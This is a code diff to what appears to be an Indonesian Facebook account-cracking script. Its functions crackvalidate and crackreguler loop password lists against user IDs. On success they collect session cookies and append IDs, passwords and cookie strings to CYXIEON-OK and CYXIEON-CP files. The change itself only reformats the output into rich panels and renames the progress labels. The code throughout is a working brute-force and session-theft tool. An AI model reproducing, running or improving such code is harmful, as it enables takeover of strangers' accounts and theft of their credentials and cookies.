@@ -742,8 +742,8 @@ def crackvalidate(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
-	emot = rc(["🥸",])
-	prog.update(des,description=f"\r {emot}(Validate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	emot = rc(["😝","😜","🤪"])
+	prog.update(des,description=f"\r {emot}(RulValidate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -795,19 +795,12 @@ def crackvalidate(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
-				print(f"⌲ Password: {hijo}{pw}{puti}")
-				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
-				print(f'{hijo}{ua}')
+				prints(panel(f"\n⌲ User ID: {hijo}{idf}{puti}\n⌲ Password: {hijo}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n⌲ Cookie: {hijo}{kuki}{puti}\n{hijo}{ua}",title=f"[[green] RulSucces [/]]",style=f"bold blue"))
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\n⌲ User ID: {kun}{idf}{puti}")
-				print(f"⌲ Password: {kun}{pw}{puti}")
-				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f'{kun}{ua}')
+				prints(panel(f"\n⌲ User ID: {kun}{idf}{puti}\n⌲ Password: {kun}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n{kun}{ua}",title=f"[[green] RulCheckpoint [/]]",style=f"bold blue"))
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
@@ -827,7 +820,7 @@ def crackreguler(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot}(REGULER)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}(RulReguler)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -879,19 +872,12 @@ def crackreguler(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
-				print(f"⌲ Password: {hijo}{pw}{puti}")
-				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
-				print(f'{hijo}{ua}')
+				prints(panel(f"\n⌲ User ID: {hijo}{idf}{puti}\n⌲ Password: {hijo}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n⌲ Cookie: {hijo}{kuki}{puti}\n{hijo}{ua}",title=f"[[green] RulSucces [/]]",style=f"bold blue"))
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\n⌲ User ID: {kun}{idf}{puti}")
-				print(f"⌲ Password: {kun}{pw}{puti}")
-				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f'{kun}{ua}')
+				prints(panel(f"\n⌲ User ID: {kun}{idf}{puti}\n⌲ Password: {kun}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n{kun}{ua}",title=f"[[green] RulCheckpoint [/]]",style=f"bold blue"))
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
